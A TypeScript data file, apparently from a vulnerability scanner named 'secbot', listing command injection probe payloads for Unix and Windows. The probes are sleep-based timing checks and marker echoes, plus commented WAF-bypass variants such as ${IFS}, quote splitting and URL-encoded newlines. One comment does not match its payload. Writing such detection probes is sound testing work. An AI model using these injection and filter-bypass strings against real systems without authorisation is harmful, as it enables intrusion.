export interface CmdiTimingPayload {
  payload: string;
  delay: number;
  os: 'unix' | 'windows';
}

export interface CmdiOutputPayload {
  payload: string;
  marker: string;
  os: 'unix' | 'windows';
}

export const CMDI_PAYLOADS_TIMING: CmdiTimingPayload[] = [
  { payload: '; sleep 5', delay: 5, os: 'unix' },
  { payload: '| sleep 5', delay: 5, os: 'unix' },
  { payload: '`sleep 5`', delay: 5, os: 'unix' },
  { payload: '$(sleep 5)', delay: 5, os: 'unix' },
  { payload: '%0asleep 5', delay: 5, os: 'unix' },
  // Grouped execution — bypasses simple semicolon/pipe filtering
  { payload: '; { sleep 5; }', delay: 5, os: 'unix' },
  // Shell invocation bypass — spawns new shell, bypasses argument parsing filters
  { payload: "; sh -c 'sleep 5'", delay: 5, os: 'unix' },
  { payload: "; bash -c 'sleep 5'", delay: 5, os: 'unix' },
  // Windows variants
  { payload: '& timeout /t 5', delay: 5, os: 'windows' },
  { payload: '| timeout /t 5', delay: 5, os: 'windows' },
  // Windows cmd invocation bypass
  { payload: '& cmd /c timeout /t 5', delay: 5, os: 'windows' },
  // ── WAF bypass variants ──────────────────────────────────────────
  // ${IFS} replaces space — bypasses space-filtering WAFs
  { payload: ';sleep${IFS}5', delay: 5, os: 'unix' },
  { payload: '|sleep${IFS}5', delay: 5, os: 'unix' },
  // Tab character as separator (bypasses space filters)
  { payload: ";\tsleep\t5", delay: 5, os: 'unix' },
  // Newline injection (URL-encoded \n)
  { payload: '%0asleep%205', delay: 5, os: 'unix' },
  // String concatenation bypass — s''leep → sleep
  { payload: ";s''leep 5", delay: 5, os: 'unix' },
  // Backslash bypass — sl\\eep → sleep (shell removes backslash)
  { payload: ';sl\\eep 5', delay: 5, os: 'unix' },
  // Windows PowerShell variant
  { payload: '& Start-Sleep -Seconds 5', delay: 5, os: 'windows' },
];

export const CMDI_PAYLOADS_OUTPUT: CmdiOutputPayload[] = [
  { payload: '; echo secbot-cmdi-marker', marker: 'secbot-cmdi-marker', os: 'unix' },
  { payload: '| echo secbot-cmdi-marker', marker: 'secbot-cmdi-marker', os: 'unix' },
  { payload: '`echo secbot-cmdi-marker`', marker: 'secbot-cmdi-marker', os: 'unix' },
  { payload: '$(echo secbot-cmdi-marker)', marker: 'secbot-cmdi-marker', os: 'unix' },
  // Unix additional chaining variants
  { payload: '&& echo secbot-cmdi-marker', marker: 'secbot-cmdi-marker', os: 'unix' },
  { payload: '|| echo secbot-cmdi-marker', marker: 'secbot-cmdi-marker', os: 'unix' },
  // Grouped execution — bypasses simple delimiter filtering
  { payload: '; { echo secbot-cmdi-marker; }', marker: 'secbot-cmdi-marker', os: 'unix' },
  // Shell invocation bypass — spawns new shell
  { payload: "; sh -c 'echo secbot-cmdi-marker'", marker: 'secbot-cmdi-marker', os: 'unix' },
  { payload: "; bash -c 'echo secbot-cmdi-marker'", marker: 'secbot-cmdi-marker', os: 'unix' },
  // Windows output markers
  { payload: '& echo secbot-cmdi-marker', marker: 'secbot-cmdi-marker', os: 'windows' },
  { payload: '| echo secbot-cmdi-marker', marker: 'secbot-cmdi-marker', os: 'windows' },
  { payload: '&& echo secbot-cmdi-marker', marker: 'secbot-cmdi-marker', os: 'windows' },
  // Windows cmd invocation bypass
  { payload: '& cmd /c echo secbot-cmdi-marker', marker: 'secbot-cmdi-marker', os: 'windows' },
  // ── WAF bypass variants ──────────────────────────────────────────
  // ${IFS} replaces space
  { payload: ';echo${IFS}secbot-cmdi-marker', marker: 'secbot-cmdi-marker', os: 'unix' },
  { payload: '|echo${IFS}secbot-cmdi-marker', marker: 'secbot-cmdi-marker', os: 'unix' },
  // Newline injection
  { payload: '%0aecho%20secbot-cmdi-marker', marker: 'secbot-cmdi-marker', os: 'unix' },
  // String concatenation bypass — ec''ho → echo
  { payload: ";ec''ho secbot-cmdi-marker", marker: 'secbot-cmdi-marker', os: 'unix' },
  // Variable concatenation — $'\x65'cho → echo
  { payload: ";e\\cho secbot-cmdi-marker", marker: 'secbot-cmdi-marker', os: 'unix' },
  // Windows PowerShell
  { payload: '& Write-Output secbot-cmdi-marker', marker: 'secbot-cmdi-marker', os: 'windows' },
];
